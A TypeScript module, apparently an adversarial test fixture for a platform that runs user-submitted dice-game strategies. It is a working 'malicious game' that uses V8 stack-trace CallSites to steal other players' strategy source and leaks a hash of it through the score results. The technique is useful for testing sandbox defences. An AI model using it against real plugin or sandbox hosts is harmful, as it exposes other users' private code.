import type { Game, Player } from '../commonTypes.d.ts'

/**
 * Malicious game: exfiltrates other players' strategy source.
 *
 * Technique: call each player's strategy with a honeypot api. The honeypot's
 * methods use Error.prepareStackTrace + CallSite.getFunction() to reach into
 * the caller's frame and grab the live strategy function — bypassing the
 * caller/arguments traps (those guard property access, not V8 CallSites) and
 * needing no toString on anything the game was handed.
 *
 * The capture helper deliberately lives at module scope, NOT in a class
 * method: class bodies are strict mode, and V8 hides non-strict frames'
 * function objects from CallSite.getFunction() when the accessing frame is
 * strict. Real attack code would do the same — the game bundle's top level is
 * sloppy, and the game runs before any strategy is compiled.
 *
 * The stolen source is hashed into per-player scores, so the exfiltrated data
 * rides out through the results map the host persists and displays — a
 * channel no strategy-side sanitizer can intercept, because the game itself
 * computes the scores.
 */

// Module-scope (sloppy) frame-dump helper, shared across all honeypot calls.
let capturedSource = ''

function dumpFramesIntoCapture (): void {
	const e = new Error()
	const saved = Error.prepareStackTrace
	Error.prepareStackTrace = (err, cs) => cs
	const frames = e.stack as unknown as Array<{ getFunction: () => unknown }>
	Error.prepareStackTrace = saved
	for (const frame of frames) {
		try {
			const fn = frame.getFunction()
			if (typeof fn === 'function') {
				capturedSource += fn.toString()
			}
		} catch {
			// Frame not accessible.
		}
	}
}

function makeHoneypotApi (): Record<string, unknown> {
	return {
		roll: () => {
			dumpFramesIntoCapture()
			return 12
		},
		isFirstInRound: () => true,
		getPreviousAction: () => null,
		getPreviousActions: () => [],
		calculateDieScore: (dice: [number, number]) => dice[0] * 10 + dice[1],
		detEllerDerover: () => {},
		lie: () => {},
		reveal: () => {},
		roundUpToValidScore: (score: number) => score
	}
}

// Stable hash of the captured source, used to encode the payload into scores.
function hash (input: string): number {
	let hash = 0
	for (let i = 0; i < input.length; i++) {
		hash = ((hash << 5) - hash + input.charCodeAt(i)) | 0
	}
	return hash
}

export class Main implements Game {
	private players: Player[] = []
	private stolen: Record<string, number> = {}

	init (players: Player[]) {
		this.players = players
	}

	playRound () {
		const scores: Record<string, number> = {}

		for (const player of this.players) {
			capturedSource = ''
			try {
				player.strategy(makeHoneypotApi())
			} catch {
				// A strategy that rejects the honeypot has still been framed — its
				// wrapper and bundle were on the honeypot's call stack.
			}
			// Offset so the signature is unmistakable and distinct from honest
			// Meyer scores (which hover around -0.1..-1, never below -2).
			scores[player.submissionId] = -1000 + (hash(capturedSource) % 1000) / 1000
		}

		this.stolen = scores
	}

	getResults () {
		return new Map(Object.entries(this.stolen))
	}
}

export default Main
